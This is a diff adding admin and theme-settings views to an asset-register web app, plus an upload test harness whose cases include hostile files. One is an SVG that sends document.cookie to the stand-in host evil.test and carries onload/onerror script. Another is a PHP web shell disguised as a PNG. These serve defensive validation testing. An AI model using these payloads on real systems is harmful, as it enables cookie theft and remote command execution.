+    try{ await fn(); const b=await API.bootstrap();
+      S.sites=b.sites;S.depts=b.depts;S.companies=b.companies;S.assets=b.assets;
+      render(); if(ok)toast(ok); }
+    catch(err){ if(!handleAuthLoss(err))toast(err.message); }
+  };
+  $('#caddb').onclick=()=>{
+    const n=$('#cname').value.trim(),c=$('#ccode').value.trim().toUpperCase();
+    if(!n||!c)return toast('Company name and code are both needed');
+    run(()=>API.createCompany({name:n,code:c}),'Company added');
+  };
+  $('#saddb').onclick=()=>{
+    const n=$('#sname').value.trim(),c=$('#scode').value.trim().toUpperCase();
+    if(!n||!c)return toast('Site name and code are both needed');
+    run(()=>API.createSite({name:n,code:c,location:$('#sloc').value.trim(),companyId:$('#scomp').value}),'Site added');
+  };
+  v.querySelectorAll('[data-dels]').forEach(b=>b.onclick=()=>run(()=>API.deleteSite(b.dataset.dels),'Site removed'));
+  v.querySelectorAll('[data-delc]').forEach(b=>b.onclick=()=>run(()=>API.deleteCompany(b.dataset.delc),'Company removed'));
+}
+
+/* ---------- admin: departments ---------- */
+function vDepts(v){
+  if(guard(v))return;
+  const count=n=>S.assets.filter(a=>a.dept===n).length;
+  v.innerHTML=`
+  <div class="card" style="max-width:640px">
+    <header><h2>Departments</h2><span style="margin-left:auto;color:var(--muted);font-size:12.5px">Renaming updates every assigned asset</span></header>
+    <div class="tw"><table><thead><tr><th>Department</th><th>Assets</th><th class="noprint"></th></tr></thead><tbody>
+      ${S.depts.map(d=>`<tr>
+        <td><input type="text" value="${esc(d.name)}" data-dn="${d.id}"></td>
+        <td class="mono">${count(d.name)}</td>
+        <td class="noprint"><button class="btn sm d" data-deld="${d.id}" ${count(d.name)?'disabled title="Reassign its assets first"':''}>Remove</button></td>
+      </tr>`).join('')}
+    </tbody></table></div>
+    <div class="in row"><input type="text" id="dname" placeholder="New department" style="width:240px"><button class="btn p" id="daddb">Add department</button></div>
+  </div>`;
+  const run=async(fn,ok)=>{
+    try{ await fn(); const b=await API.bootstrap();
+      S.depts=b.depts;S.assets=b.assets; render(); if(ok)toast(ok); }
+    catch(err){ if(!handleAuthLoss(err))toast(err.message); }
+  };
+  $('#daddb').onclick=()=>{
+    const n=$('#dname').value.trim();
+    if(!n)return toast('Enter a department name');
+    run(()=>API.createDept(n),'Department added');
+  };
+  v.querySelectorAll('[data-dn]').forEach(i=>i.onchange=()=>{
+    const nu=i.value.trim();
+    if(!nu)return render();
+    run(()=>API.renameDept(i.dataset.dn,nu),'Renamed');
+  });
+  v.querySelectorAll('[data-deld]').forEach(b=>b.onclick=()=>run(()=>API.deleteDept(b.dataset.deld),'Department removed'));
+}
+
+/* ---------- admin: custom fields ---------- */
+function vFields(v){
+  if(guard(v))return;
+  v.innerHTML=`
+  <div class="grid" style="gap:14px;max-width:900px">
+    <div class="card">
+      <header><h2>Custom fields</h2><span style="margin-left:auto;color:var(--muted);font-size:12.5px">Appear on the add form, the asset drawer and CSV exports</span></header>
+      <div class="tw"><table><thead><tr><th>Label</th><th>Key</th><th>Type</th><th>Choices</th><th>Required</th><th>In table</th><th class="noprint"></th></tr></thead><tbody>
+        ${S.fields.length?S.fields.map(f=>`<tr>
+          <td>${esc(f.label)}</td><td class="mono">${esc(f.key)}</td><td>${esc(f.type)}</td>
+          <td><span class="trunc">${esc((f.options||[]).join(', ')||'—')}</span></td>
+          <td><input type="checkbox" data-req="${f.id}" ${f.required?'checked':''}></td>
+          <td><input type="checkbox" data-tab="${f.id}" ${f.inTable?'checked':''}></td>
+          <td class="noprint"><button class="btn sm d" data-delf="${f.id}">Remove</button></td>
+        </tr>`).join(''):`<tr><td colspan="7"><div class="empty"><b>No custom fields yet</b>Add one below to start capturing information the standard form does not cover.</div></td></tr>`}
+      </tbody></table></div>
+    </div>
+    <div class="card">
+      <header><h2>Add a field</h2></header>
+      <div class="in">
+        <div class="g2">
+          <label class="f"><span>Label <i>*</i></span><input type="text" id="flabel" placeholder="Purchase order number"></label>
+          <label class="f"><span>Type</span><select id="ftype2"><option value="text">Text</option><option value="number">Number</option><option value="date">Date</option><option value="select">Choice list</option></select></label>
+        </div>
+        <label class="f" id="foptwrap" style="display:none"><span>Choices, one per line</span><textarea id="foptions" rows="3" placeholder="Under warranty&#10;AMC&#10;Not covered"></textarea></label>
+        <div class="row">
+          <label class="row" style="gap:5px"><input type="checkbox" id="freq"> Required</label>
+          <label class="row" style="gap:5px"><input type="checkbox" id="ftab"> Show as a table column</label>
+        </div>
+        <div class="row" style="margin-top:10px"><button class="btn p" id="faddb">Add field</button></div>
+      </div>
+    </div>
+  </div>`;
+  $('#ftype2').onchange=e=>$('#foptwrap').style.display=e.target.value==='select'?'':'none';
+  const run=async(fn,ok)=>{
+    try{ await fn(); const b=await API.bootstrap(); S.fields=b.fields; render(); if(ok)toast(ok); }
+    catch(err){ if(!handleAuthLoss(err))toast(err.message); }
+  };
+  $('#faddb').onclick=()=>{
+    const label=$('#flabel').value.trim();
+    if(!label)return toast('Give the field a label');
+    const type=$('#ftype2').value;
+    run(()=>API.createField({
+      label,type,
+      options:type==='select'?$('#foptions').value.split('\n').map(x=>x.trim()).filter(Boolean):[],
+      required:$('#freq').checked,inTable:$('#ftab').checked
+    }),'Field added');
+  };
+  v.querySelectorAll('[data-req]').forEach(c=>c.onchange=()=>run(()=>API.updateField(c.dataset.req,{required:c.checked})));
+  v.querySelectorAll('[data-tab]').forEach(c=>c.onchange=()=>run(()=>API.updateField(c.dataset.tab,{inTable:c.checked})));
+  v.querySelectorAll('[data-delf]').forEach(b=>b.onclick=()=>{
+    const f=S.fields.find(x=>x.id===b.dataset.delf);
+    if(!confirm('Remove "'+f.label+'"? Values already recorded on assets stay in storage but stop showing.'))return;
+    run(()=>API.deleteField(b.dataset.delf),'Field removed');
+  });
+}
+
+/* ---------- admin: portal users ---------- */
+function vUsers(v){
+  if(guard(v))return;
+  v.innerHTML=`
+  <div class="grid" style="gap:14px;max-width:1000px">
+    <div class="card">
+      <header><h2>Portal users</h2></header>
+      <div class="tw"><table><thead><tr><th>Name</th><th>Email</th><th>Role</th><th>Site access</th><th>Active</th><th class="noprint"></th></tr></thead><tbody>
+        ${S.users.map(u=>`<tr>
+          <td>${esc(u.name)}${ME&&ME.id===u.id?' <span class="chip">you</span>':''}</td>
+          <td>${esc(u.email)}</td>
+          <td><select data-role="${u.id}">${['Admin','Manager','Viewer'].map(r=>`<option ${u.role===r?'selected':''}>${r}</option>`).join('')}</select></td>
+          <td><div class="chips">${u.sites.length?u.sites.map(c=>`<span class="chip">${esc(siteName(c))}<button data-unsite="${u.id}|${c}" aria-label="Remove">×</button></span>`).join(''):'<span style="color:var(--muted)">All sites</span>'}
+            <select data-addsite="${u.id}" style="width:auto"><option value="">Limit to…</option>${S.sites.filter(s=>!u.sites.includes(s.code)).map(s=>`<option value="${s.code}">${esc(s.name)}</option>`).join('')}</select></div></td>
+          <td><input type="checkbox" data-act="${u.id}" ${u.active?'checked':''}></td>
+          <td class="noprint"><button class="btn sm" data-reset="${u.id}">Reset token</button>
+            <button class="btn sm d" data-delu="${u.id}" ${ME&&ME.id===u.id?'disabled title="You cannot remove your own account"':''}>Remove</button></td>
+        </tr>`).join('')}
+      </tbody></table></div>
+    </div>
+    <div class="card">
+      <header><h2>Create a user</h2></header>
+      <div class="in">
+        <div class="g2">
+          <label class="f"><span>Full name <i>*</i></span><input type="text" id="uname"></label>
+          <label class="f"><span>Email <i>*</i></span><input type="email" id="uemail"></label>
+          <label class="f"><span>Role</span><select id="urole"><option>Viewer</option><option>Manager</option><option>Admin</option></select></label>
+          <label class="f"><span>Temporary password <i>*</i></span><input type="password" id="upass" autocomplete="new-password" placeholder="At least 10 characters"></label>
+        </div>
+        <p class="note">Admin manages every section. Manager edits assets and imports data. Viewer reads only. Leave site access empty to cover all sites. The person is asked to change this password after signing in.</p>
+        <div class="row" style="margin-top:10px"><button class="btn p" id="uaddb">Create user</button></div>
+      </div>
+    </div>
+  </div>`;
+  const run=async(fn,ok)=>{
+    try{ await fn(); const b=await API.bootstrap(); S.users=b.users; render(); if(ok)toast(ok); }
+    catch(err){ if(!handleAuthLoss(err))toast(err.message); }
+  };
+  $('#uaddb').onclick=()=>{
+    const n=$('#uname').value.trim(),e=$('#uemail').value.trim(),pw=$('#upass').value;
+    if(!n||!e)return toast('Name and email are both needed');
+    if(!/^[^@\s]+@[^@\s]+\.[^@\s]+$/.test(e))return toast('Enter a valid email address');
+    if(pw.length<10)return toast('The password must be at least 10 characters');
+    run(()=>API.createUser({name:n,email:e,role:$('#urole').value,password:pw}),'User created');
+  };
+  v.querySelectorAll('[data-role]').forEach(s=>s.onchange=()=>run(()=>API.updateUser(s.dataset.role,{role:s.value}),'Role changed'));
+  v.querySelectorAll('[data-act]').forEach(c=>c.onchange=()=>run(()=>API.updateUser(c.dataset.act,{active:c.checked})));
+  v.querySelectorAll('[data-addsite]').forEach(s=>s.onchange=()=>{
+    if(!s.value)return;
+    const u=S.users.find(x=>x.id===s.dataset.addsite);
+    run(()=>API.updateUser(u.id,{sites:[...u.sites,s.value]}));
+  });
+  v.querySelectorAll('[data-unsite]').forEach(b=>b.onclick=()=>{
+    const [id,c]=b.dataset.unsite.split('|');const u=S.users.find(x=>x.id===id);
+    run(()=>API.updateUser(id,{sites:u.sites.filter(x=>x!==c)}));
+  });
+  v.querySelectorAll('[data-delu]').forEach(b=>b.onclick=()=>run(()=>API.deleteUser(b.dataset.delu),'User removed'));
+  v.querySelectorAll('[data-reset]').forEach(b=>b.onclick=async()=>{
+    b.disabled=true;
+    try{
+      const r=await API.issueResetToken(b.dataset.reset);
+      showResetToken(r);
+    }catch(err){ b.disabled=false; if(!handleAuthLoss(err))toast(err.message); }
+  });
+}
+
+/**
+ * Shows a reset token once. There is no mail server here, so the administrator
+ * passes it on through a channel they already trust.
+ */
+function showResetToken(r){
+  const wrap=document.createElement('div');
+  wrap.innerHTML=`<div class="modal" role="dialog" aria-modal="true" aria-label="Reset token"><div class="box">
+    <h2>Reset token for ${esc(r.email)}</h2>
+    <p>Give this to them through a channel you trust. It works once and expires in an hour. It is shown only now.</p>
+    <div class="rlog" style="max-height:none;word-break:break-all">${esc(r.token)}</div>
+    <div class="row" style="margin-top:12px">
+      <button class="btn" id="rtcopy">Copy</button>
+      <button class="btn p" id="rtdone">Done</button>
+    </div>
+  </div></div>`;
+  document.body.appendChild(wrap);
+  wrap.querySelector('#rtcopy').onclick=()=>{
+    if(navigator.clipboard&&navigator.clipboard.writeText)
+      navigator.clipboard.writeText(r.token).then(()=>toast('Copied'),()=>toast('Copy failed'));
+    else toast('Select the token and copy it by hand');
+  };
+  wrap.querySelector('#rtdone').onclick=()=>{wrap.remove();render();};
+}
+
+/* ---------- activity log ---------- */
+function vLog(v){
+  v.innerHTML=`<div class="card"><div class="in">Loading the activity log…</div></div>`;
+  API.activity().then(r=>{
+    ACTIVITY=r.log;
+    if(VIEW!=='log')return;
+    v.innerHTML=`
+    <div class="card">
+      <header><h2>Activity log</h2><span style="margin-left:auto;color:var(--muted);font-size:12.5px">${ACTIVITY.length} entries, newest first</span>
+      <button class="btn noprint" id="lcsv">Export CSV</button></header>
+      <div class="tw"><table><thead><tr><th>When</th><th>Who</th><th>Action</th><th>Detail</th></tr></thead><tbody>
+        ${ACTIVITY.length?ACTIVITY.map(l=>`<tr><td class="mono" style="white-space:nowrap">${esc(fmtDT(l.ts))}</td><td>${esc(l.actor)}</td><td>${esc(l.action)}</td><td>${esc(l.detail)}</td></tr>`).join('')
+          :`<tr><td colspan="4"><div class="empty"><b>Nothing recorded yet</b>Changes appear here as they happen.</div></td></tr>`}
+      </tbody></table></div>
+    </div>`;
+    const b=document.getElementById('lcsv');
+    if(b)b.onclick=()=>{
+      download('activity-log.csv',[['When','Who','Action','Detail'],...ACTIVITY.map(l=>[fmtDT(l.ts),l.actor,l.action,l.detail])].map(r=>r.map(csvCell).join(',')).join('\n'));
+      toast('Exported');
+    };
+  }).catch(err=>{
+    if(handleAuthLoss(err))return;
+    v.innerHTML=`<div class="alert e">${esc(err.message)}</div>`;
+  });
+}
+
+/* ---------- boot ---------- */
+async function boot(){
+  document.body.innerHTML='<div class="empty" style="padding:80px"><b>Loading the asset register</b>One moment.</div>';
+  try{
+    await loadState();
+    // An account created by an administrator carries a temporary password.
+    // Open the security dialog straight away rather than letting it sit unused.
+    if(ME&&ME.mustChange){
+      PWOPEN=true;
+      render();
+      toast('This is a temporary password. Please set your own.');
+      return;
+    }
+    render();
+  }catch(err){
+    if(err&&err.status===401){ renderLogin(); return; }
+    document.body.innerHTML=`<div class="empty" style="padding:80px"><b>The register could not start</b>${esc(err.message)}</div>`;
+  }
+}
+
+async function start(){
+  try{
+    const r=await API.me();
+    ME=r.user;
+    await boot();
+  }catch(err){
+    renderLogin(err.status===401?null:err.message);
+  }
+}
+if(document.readyState==='loading')document.addEventListener('DOMContentLoaded',start);
+else start();
+/* ============================================================================
+   Theme settings — admin-editable colours, typography and company logo.
+
+   The functions in TAPI stand in for the Express endpoints in routes/admin.js.
+   They keep the real contract: same status codes, same { error: { code, message,
+   fields } } shape, and the same ordering on replace — commit the settings
+   record first, delete the superseded file only afterwards.
+   ========================================================================== */
+
+/** Resolves the logo URL; the server streams the bytes with hardened headers. */
+function logoSrc(l){ return l ? l.url : null; }
+
+/* The request log shows what the server actually answered. */
+function rlog(method, path, status, note){
+  RLOG.unshift({ t:new Date().toLocaleTimeString('en-GB'), method, path, status, note });
+  if(RLOG.length > 30) RLOG.length = 30;
+  const el = document.getElementById('rlog');
+  if(el) el.innerHTML = renderRlog();
+}
+function renderRlog(){
+  if(!RLOG.length) return '<span class="dim">No requests yet.</span>';
+  return RLOG.map(l =>
+    `<div><span class="dim">${l.t}</span> <span class="m">${l.method}</span> ${esc(l.path)} ` +
+    `<span class="${l.status < 300 ? 'ok' : 'no'}">${l.status}</span>` +
+    `${l.note ? ` <span class="dim">${esc(l.note)}</span>` : ''}</div>`
+  ).join('');
+}
+
+/** Wraps an API call so the log records the real status either way. */
+async function traced(method, path, fn, noteOk){
+  try{
+    const out = await fn();
+    rlog(method, path, path.includes('/logo') && method === 'POST' ? 201 : 200, noteOk ? noteOk(out) : '');
+    return out;
+  }catch(err){
+    rlog(method, path, err.status || 0, err.code || 'ERROR');
+    throw err;
+  }
+}
+
+const TAPI = {
+  putTheme: t => traced('PUT', '/api/settings/theme', () => API.putTheme(t)),
+  resetTheme: action => traced('POST', '/api/settings/theme/reset', () => API.resetTheme(action)),
+  postLogo: async file => {
+    const b64 = await fileToBase64(file);
+    return traced('POST', '/api/settings/logo', () => API.putLogo(b64),
+      r => (r.deduplicated ? 'deduplicated' : 'stored') +
+           (r.sanitizedBytes > 0 ? `, ${r.sanitizedBytes} bytes of active content stripped` : ''));
+  },
+  deleteLogo: () => traced('DELETE', '/api/settings/logo', () => API.deleteLogo())
+};
+
+/* ---------- theme settings view ---------- */
+const COLOR_FIELDS = [
+  { key:'primaryColor',    label:'Primary colour' },
+  { key:'secondaryColor',  label:'Secondary colour' },
+  { key:'textColor',       label:'Text colour' },
+  { key:'backgroundColor', label:'Background colour' }
+];
+const tdirty = () => JSON.stringify(TDRAFT) !== JSON.stringify(TSAVED);
+
+function vTheme(v){
+  if(guard(v)) return;
+  if(!TDRAFT){ TDRAFT = { ...S.theme }; TSAVED = { ...S.theme }; }
+  const ratio = contrastRatio(TDRAFT.textColor, TDRAFT.backgroundColor);
+  const busy = TST.saving, dis = busy ? 'disabled' : '';
+
+  v.innerHTML = `
+  ${TST.error   ? `<div class="alert e" role="alert">${esc(TST.error)}</div>` : ''}
+  ${TST.success ? `<div class="alert k" role="status">${esc(TST.success)}</div>` : ''}
+  <div class="tcols">
+    <div class="card"><div class="in">
+      <fieldset ${dis}>
+        <legend>Colours</legend>
+        ${COLOR_FIELDS.map(f => `
+          <label class="f"><span>${f.label}</span>
+            <div class="colrow">
+              <input type="color" value="${isHexColor(TDRAFT[f.key]) ? normalizeHex(TDRAFT[f.key]) : '#000000'}"
+                     data-color="${f.key}" aria-label="${f.label} picker">
+              <input type="text" class="mono" value="${esc(TDRAFT[f.key])}" data-hex="${f.key}"
+                     spellcheck="false" aria-invalid="${TERR[f.key] ? 'true' : 'false'}">
+            </div>
+            ${TERR[f.key] ? `<em class="ferr">${esc(TERR[f.key])}</em>` : ''}
+          </label>`).join('')}
+        ${ratio < 4.5 ? `<p class="twarn" role="status">Text on background is ${ratio.toFixed(2)}:1. WCAG AA asks for 4.5:1. You can still save this.</p>` : ''}
+      </fieldset>
+
+      <fieldset ${dis}>
+        <legend>Typography</legend>
+        <label class="f"><span>Font family</span>
+          <select id="tff">${FONT_FAMILIES.map(f => `<option value="${f.id}" ${TDRAFT.fontFamily === f.id ? 'selected' : ''}>${esc(f.label)}</option>`).join('')}</select>
+          ${TERR.fontFamily ? `<em class="ferr">${esc(TERR.fontFamily)}</em>` : ''}
+        </label>
+        <label class="f"><span>Base font size — ${TDRAFT.fontSize}px</span>
+          <input type="range" id="tfs" min="${FONT_SIZE_MIN}" max="${FONT_SIZE_MAX}" step="1"
+                 value="${TDRAFT.fontSize}" style="width:100%">
+          ${TERR.fontSize ? `<em class="ferr">${esc(TERR.fontSize)}</em>` : ''}
+        </label>
+      </fieldset>
+
+      <fieldset ${dis}>
+        <legend>Company logo</legend>
+        ${S.logo ? `<div class="logobox">
+          <img src="${logoSrc(S.logo)}" alt="Current company logo">
+          <div class="meta">Stored as<br><span class="mono">${esc(S.logo.filename)}</span><br>${(S.logo.bytes/1024).toFixed(1)} KB · ${esc(S.logo.format.toUpperCase())}</div>
+        </div>` : '<p class="note" style="margin-bottom:10px">No logo uploaded.</p>'}
+        ${TPEND ? `<div class="logobox pending">
+            <img src="${TPEND.url}" alt="Logo preview">
+            <div class="meta"><strong>Preview — not saved yet</strong><br>${esc(TPEND.file.name)}<br>${(TPEND.file.size/1024).toFixed(1)} KB</div>
+          </div>
+          <div class="row"><button class="btn p" id="tlsave" ${dis}>Save logo</button><button class="btn" id="tldrop">Discard</button></div>`
+        : `<div class="drop" id="tdrop">
+            <input type="file" id="tfile" accept="image/png,image/jpeg,image/svg+xml">
+            <p style="margin:8px 0 0;color:var(--muted);font-size:12.5px">PNG, JPG or SVG · up to 2 MB · or drop a file here</p>
+          </div>
+          ${S.logo ? `<div class="row" style="margin-top:9px"><button class="btn d" id="tldel" ${dis}>Remove logo</button></div>` : ''}`}
+      </fieldset>
+
+      <div class="row">
+        <button class="btn p" id="tsave" ${busy || !tdirty() ? 'disabled' : ''}>${busy ? '<span class="spin"></span>Saving…' : 'Save changes'}</button>
+        <button class="btn" id="treset" ${dis}>Reset to default</button>
+        ${tdirty() ? '<span class="dirty">Unsaved changes</span>' : ''}
+      </div>
+    </div></div>
+
+    <div class="tsticky">
+      <div class="card">
+        <header><h2>Live preview</h2><span style="margin-left:auto;color:var(--muted);font-size:12.5px">Scoped — the rest of the page is unaffected until you save</span></header>
+        <div class="in"><div class="stage" id="tstage">
+          ${S.logo ? `<img class="lg" src="${logoSrc(S.logo)}" alt="">` : ''}
+          <h3>Fleet overview</h3>
+          <p>Body copy in ${esc(fontStackFor(TDRAFT.fontFamily).split(',')[0].replace(/"/g,''))} at ${TDRAFT.fontSize}px. The table below uses the derived small size, not the base value.</p>
+          <button class="pbtn">Add asset</button><span class="sec">Export CSV</span>
+          <table><thead><tr><th>Asset tag</th><th>Site</th><th>Status</th></tr></thead>
+            <tbody>
+              <tr><td class="mono">HO-PC-001</td><td>Head Office</td><td>In use</td></tr>
+              <tr><td class="mono">DWC-PC-014</td><td>West County</td><td>Replace due</td></tr>
+            </tbody></table>
+        </div></div>
+      </div>
+      <div class="card" style="margin-top:14px">
+        <header><h2>Request log</h2><span style="margin-left:auto;color:var(--muted);font-size:12.5px">Status codes from the API</span></header>
+        <div class="in"><div class="rlog" id="rlog">${renderRlog()}</div></div>
+      </div>
+    </div>
+  </div>`;
+
+  applyTheme(TDRAFT, document.getElementById('tstage'));   // scoped preview only
+
+  v.querySelectorAll('[data-color]').forEach(i => i.oninput = () => tset(i.dataset.color, i.value));
+  v.querySelectorAll('[data-hex]').forEach(i => {
+    // Update the preview and the dirty state in place, so the caret survives typing.
+    i.oninput = () => { TDRAFT[i.dataset.hex] = i.value; repaintStage(); refreshDirty(); };
+    i.onblur  = () => render();
+  });
+  document.getElementById('tff').onchange = e => tset('fontFamily', e.target.value);
+  document.getElementById('tfs').oninput  = e => tset('fontSize', Number(e.target.value));
+  document.getElementById('tsave').onclick  = doThemeSave;
+  document.getElementById('treset').onclick = () => { TRESET = true; render(); };
+
+  const f = document.getElementById('tfile');
+  if(f) f.onchange = e => chooseLogo(e.target.files[0]);
+  const d = document.getElementById('tdrop');
+  if(d){
+    d.ondragover  = e => { e.preventDefault(); d.classList.add('over'); };
+    d.ondragleave = () => d.classList.remove('over');
+    d.ondrop      = e => { e.preventDefault(); d.classList.remove('over'); chooseLogo(e.dataTransfer.files[0]); };
+  }
+  const ls = document.getElementById('tlsave');
+  if(ls) ls.onclick = doLogoSave;
+  const ld = document.getElementById('tldrop');
+  if(ld) ld.onclick = () => { URL.revokeObjectURL(TPEND.url); TPEND = null; render(); };
+  const del = document.getElementById('tldel');
+  if(del) del.onclick = doLogoDelete;
+}
+
+function repaintStage(){
+  const s = document.getElementById('tstage');
+  if(s) applyTheme(TDRAFT, s);
+}
+/** Keeps Save and the unsaved-changes hint current during uninterrupted typing. */
+function refreshDirty(){
+  const btn = document.getElementById('tsave');
+  if(!btn) return;
+  btn.disabled = TST.saving || !tdirty();
+  const row = btn.parentElement, hint = row.querySelector('.dirty');
+  if(tdirty() && !hint){
+    const s = document.createElement('span');
+    s.className = 'dirty'; s.textContent = 'Unsaved changes';
+    row.appendChild(s);
+  } else if(!tdirty() && hint) hint.remove();
+}
+function tset(k, v){ TDRAFT[k] = v; TST.success = null; render(); }
+
+async function doThemeSave(){
+  const check = validateTheme(TDRAFT, TSAVED);
+  if(!check.valid){ TERR = check.errors; render(); return; }
+  TERR = {}; TST = { saving:true, error:null, success:null }; render();
+  try{
+    const res = await TAPI.putTheme(TDRAFT);
+    S.theme = res.theme;
+    TDRAFT = { ...res.theme }; TSAVED = { ...res.theme };
+    applyTheme(res.theme);                                  // now repaint the app
+    const ratio = contrastRatio(res.theme.textColor, res.theme.backgroundColor);
+    TST = { saving:false, error:null,
+            success: ratio < 4.5
+              ? `Theme saved. Text on background is ${ratio.toFixed(2)}:1, below the WCAG AA minimum of 4.5:1.`
+              : 'Theme saved.' };
+  }catch(err){
+    if(handleAuthLoss(err))return;
+    TERR = err.fields || {};
+    TST = { saving:false, error:err.message, success:null };
+  }
+  render();
+}
+
+/** Client-side pre-check only; the server re-validates on content. */
+function chooseLogo(file){
+  if(!file) return;
+  if(file.size > MAX_LOGO_BYTES){ TST.error = 'Logo must be 2 MB or smaller.'; render(); return; }
+  if(!ALLOWED_MIME[String(file.type).toLowerCase()]){ TST.error = 'Choose a PNG, JPG or SVG file.'; render(); return; }
+  if(TPEND) URL.revokeObjectURL(TPEND.url);
+  TPEND = { file, url:URL.createObjectURL(file) };
+  TST.error = null; TST.success = null;
+  render();
+}
+async function doLogoSave(){
+  if(!TPEND) return;
+  TST = { saving:true, error:null, success:null }; render();
+  try{
+    const res = await TAPI.postLogo(TPEND.file);
+    S.logo = res.logo;
+    URL.revokeObjectURL(TPEND.url); TPEND = null;
+    let msg = res.deduplicated ? 'That logo was already stored, so nothing was written.' : 'Logo updated.';
+    if(res.sanitizedBytes > 0) msg += ` ${res.sanitizedBytes} bytes of active content were stripped from the SVG.`;
+    TST = { saving:false, error:null, success:msg };
+  }catch(err){ if(!handleAuthLoss(err))TST = { saving:false, error:err.message, success:null }; }
+  render();
+}
+async function doLogoDelete(){
+  TST = { saving:true, error:null, success:null }; render();
+  try{ await TAPI.deleteLogo(); S.logo = null; TST = { saving:false, error:null, success:'Logo removed.' }; }
+  catch(err){ if(handleAuthLoss(err))return; TST = { saving:false, error:err.message, success:null }; }
+  render();
+}
+
+function resetModal(){
+  return `<div class="modal" role="dialog" aria-modal="true" aria-label="Reset theme"><div class="box">
+    <h2>Reset to default</h2>
+    <p>Colours and typography go back to the shipped defaults. What should happen to the company logo? The API rejects this request without an explicit choice.</p>
+    <div class="row">
+      <button class="btn" id="rkeep">Keep the logo</button>
+      <button class="btn d" id="rdel">Delete the logo too</button>
+      <button class="btn" id="rcancel">Cancel</button>
+    </div>
+  </div></div>`;
+}
+function bindResetModal(){
+  const k = document.getElementById('rkeep');
+  if(!k) return;
+  k.onclick = () => doThemeReset('keep');
+  document.getElementById('rdel').onclick = () => doThemeReset('delete');
+  document.getElementById('rcancel').onclick = () => { TRESET = false; render(); };
+}
+async function doThemeReset(action){
+  TRESET = false; TST = { saving:true, error:null, success:null }; render();
+  try{
+    const res = await TAPI.resetTheme(action);
+    S.theme = res.theme; S.logo = res.logo;
+    TDRAFT = { ...res.theme }; TSAVED = { ...res.theme };
+    applyTheme(res.theme);
+    TST = { saving:false, error:null,
+            success: res.logoDeleted ? 'Theme reset and logo removed.' : 'Theme reset. The logo was kept.' };
+  }catch(err){ if(!handleAuthLoss(err))TST = { saving:false, error:err.message, success:null }; }
+  render();
+}
+/* ============================================================================
+   Upload tests — a diagnostics harness, not a product feature.
+
+   Each button builds a real file in memory and sends it through the same
+   validation path a genuine upload takes, so the rejections below are produced
+   by the code that runs in production, not by a mock.
+   ========================================================================== */
+
+let CRCT = null;
+/** CRC32, needed to build a genuinely valid PNG rather than a stub. */
+function crc32(bytes){
+  if(!CRCT){
+    CRCT = new Int32Array(256);
+    for(let n = 0; n < 256; n++){
+      let c = n;
+      for(let k = 0; k < 8; k++) c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1;
+      CRCT[n] = c;
+    }
+  }
+  let c = 0xffffffff;
+  for(let i = 0; i < bytes.length; i++) c = CRCT[(c ^ bytes[i]) & 0xff] ^ (c >>> 8);
+  return (c ^ 0xffffffff) >>> 0;
+}
+function adler32(d){
+  let a = 1, b = 0;
+  for(let i = 0; i < d.length; i++){ a = (a + d[i]) % 65521; b = (b + a) % 65521; }
+  return (b << 16 | a) >>> 0;
+}
+/** Builds a 1x1 PNG with a stored (uncompressed) zlib stream — valid, no deflate needed. */
+function makePng(r, g, b){
+  const cat = (...a) => {
+    const t = new Uint8Array(a.reduce((n, x) => n + x.length, 0));
+    let o = 0;
+    for(const x of a){ t.set(x, o); o += x.length; }
+    return t;
+  };
+  const u32 = n => new Uint8Array([n >>> 24 & 255, n >>> 16 & 255, n >>> 8 & 255, n & 255]);
+  const chunk = (type, data) => {
+    const body = cat(new TextEncoder().encode(type), data);
+    return cat(u32(data.length), body, u32(crc32(body)));
+  };
+  const ihdr = new Uint8Array(13);
+  ihdr.set(u32(1), 0); ihdr.set(u32(1), 4);
+  ihdr[8] = 8; ihdr[9] = 2;
+  const raw = new Uint8Array([0, r, g, b]);
+  const len = raw.length;
+  const z = cat(new Uint8Array([0x78, 0x01, 0x01, len & 255, len >> 8 & 255, ~len & 255, (~len >> 8) & 255]),
+                raw, u32(adler32(raw)));
+  return cat(new Uint8Array([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
+             chunk('IHDR', ihdr), chunk('IDAT', z), chunk('IEND', new Uint8Array(0)));
+}
+const mkFile = (bytes, name, type) => new File([bytes], name, { type });
+const enc = s => new TextEncoder().encode(s);
+
+const UPLOAD_CASES = [
+  { id:'ok-png',  label:'Valid PNG logo',
+    note:'Expected 201 — stored under a content-hash filename',
+    make:() => mkFile(makePng(30, 90, 120), 'brand.png', 'image/png') },
+  { id:'ok-png2', label:'A different PNG',
+    note:'Expected 201 — replaces the previous file, which is then deleted',
+    make:() => mkFile(makePng(168, 68, 42), 'brand-red.png', 'image/png') },
+  { id:'dupe',    label:'The same PNG again',
+    note:'Expected 201 with deduplicated — no second file written',
+    make:() => mkFile(makePng(30, 90, 120), 'copy-of-brand.png', 'image/png') },
+  { id:'svg-ok',  label:'Clean SVG',
+    note:'Expected 201 — markup preserved',
+    make:() => mkFile(enc('<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 120 40"><rect width="120" height="40" rx="4" fill="#1e5a78"/><text x="12" y="26" fill="#fff" font-family="sans-serif" font-size="16">ACME</text></svg>'), 'logo.svg', 'image/svg+xml') },
+  { id:'svg-xss', label:'SVG carrying a script and an onload handler',
+    note:'Expected 201 — accepted, but the active content is stripped before storage',
+    make:() => mkFile(enc('<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 120 40" onload="alert(document.cookie)"><script>fetch("//evil.test/"+document.cookie)<\/script><a href="javascript:alert(1)"><rect width="120" height="40" rx="4" fill="#a8442a"/></a><foreignObject><img src=x onerror=alert(2)></foreignObject><text x="16" y="26" fill="#fff" font-family="sans-serif" font-size="15">XSS</text></svg>'), 'evil.svg', 'image/svg+xml') },
+  { id:'php',     label:'PHP shell renamed .png, mimetype forged',
+    note:'Expected 415 — rejected on magic bytes, never reaches storage',
+    make:() => mkFile(enc('<?php system($_GET["c"]); ?>' + 'A'.repeat(60)), 'logo.png', 'image/png') },
+  { id:'gif',     label:'GIF file',
+    note:'Expected 415 — not an accepted format',
+    make:() => mkFile(enc('GIF89a' + 'x'.repeat(40)), 'anim.gif', 'image/gif') },
+  { id:'trunc',   label:'Truncated PNG',
+    note:'Expected 422 — no IEND chunk, treated as corrupt',
+    make:() => mkFile(makePng(0, 0, 0).subarray(0, 28), 'cut.png', 'image/png') },
+  { id:'empty',   label:'Empty file',
+    note:'Expected 422',
+    make:() => mkFile(new Uint8Array(0), 'nothing.png', 'image/png') },
